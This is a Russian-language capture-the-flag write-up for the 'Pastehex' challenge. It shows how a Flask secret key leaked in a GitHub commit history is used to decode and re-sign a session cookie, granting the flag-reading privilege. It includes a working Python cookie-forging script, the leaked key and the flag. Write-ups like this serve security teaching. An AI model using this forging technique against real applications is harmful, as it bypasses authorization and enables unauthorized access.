# Pastehex: Write-up

Дана ссылка на сервис Абу и сессия.

В условии сказано, что проект лежит где-то на гитхабе, значит мы можем посмотреть исходники.
1) [Ищем](https://github.com/search?q=pastehex) pastehex (`:^) это отсылка на существующий сервис pastebin`) по гитхабу. Получаем 2 репозитория, нам нужен [этот](https://github.com/abuproger777/pastehex)
2) Видим коммит под названием `hotfix`. Изучив его, видим, что Абу избавился от XSS уязвимости.
3) Изучаем историю коммитов и в первом коммите видим, что Абу слил секретный ключ. Попробуем декодировать данную сессию. Получаем: `{"is_admin": True, "can_read_flag": False}`
4) С помощью секретного ключа мы можем сгенерировать новую сессию со значениями `{"is_admin": True, "can_read_flag": True}`.

```python
from flask.sessions import SecureCookieSessionInterface

session_cookie = "eyJjYW5fcmVhZF9mbGFnIjpmYWxzZSwiaXNfYWRtaW4iOnRydWV9.YXjU7w.w9asQCbJApcTY-bfEBE_Ge9TTlA"
class App:
    secret_key = "420bf172a6297fc6558b8a6075af347a83b124ccd8551b181a62bac7aefef321"

s = SecureCookieSessionInterface().get_signing_serializer(App)
data = s.loads(session_cookie)
data["can_read_flag"] = True
print(s.dumps(data))
```

Получаем новую сессию.
Заходим на страничку all_posts с этой кукой и видим:

![flag](imgs/flag.jpg)

Переходим по [ссылке](https://bit.ly/3vLmsBl) и получаем флаг!

Флаг: **kettle_please_make_sure_that_your_secret_keys_are_safe**
